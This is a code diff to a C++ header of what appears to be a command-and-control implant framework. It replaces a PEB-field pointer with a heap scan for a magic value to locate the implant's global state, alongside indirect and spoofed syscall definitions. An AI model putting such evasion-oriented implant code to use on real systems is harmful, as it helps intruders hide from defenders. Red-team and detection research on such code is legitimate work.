@@ -215,11 +215,18 @@ class Socket;
 #define SYSCALL_INDIRECT 0x100
 #define SYSCALL_SPOOF    0x250
 
-#define G_KHARON Root::Kharon* Self = (Root::Kharon*)NtCurrentPeb()->TelemetryCoverageHeader;
+#define KHARON_HEAP_MAGIC 0x545152545889
 
-typedef struct {
-
-} BEACON_INFO, *PBEACON_INFO;
+#define G_KHARON Root::Kharon* Self = []() -> Root::Kharon* { \
+    PEB* peb = NtCurrentPeb(); \
+    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
+        PVOID heapBase = peb->ProcessHeaps[i]; \
+        if (*reinterpret_cast<UINT64*>(heapBase) == KHARON_HEAP_MAGIC) { \
+            return reinterpret_cast<Root::Kharon*>(heapBase); \
+        } \
+    } \
+    return nullptr; \
+}();
 
 typedef struct JOBS {
     PPACKAGE Pkg;
@@ -235,6 +242,8 @@ namespace Root {
 
     class Kharon {    
     public:
+        UINT64 MagicValue = KHARON_HEAP_MAGIC;
+
         Crypt*     Crp; 
         Pivot*     Pvt;
         Beacon*    Bc;
@@ -1350,9 +1359,9 @@ public:
         VOID
     ) -> SIZE_T;
 
-    static auto Information(
-        PBEACON_INFO Info
-    ) -> VOID;
+    // static auto Information(
+    //     PBEACON_INFO Info
+    // ) -> VOID;
 
     static auto DriAlloc(
         SIZE_T Size, 
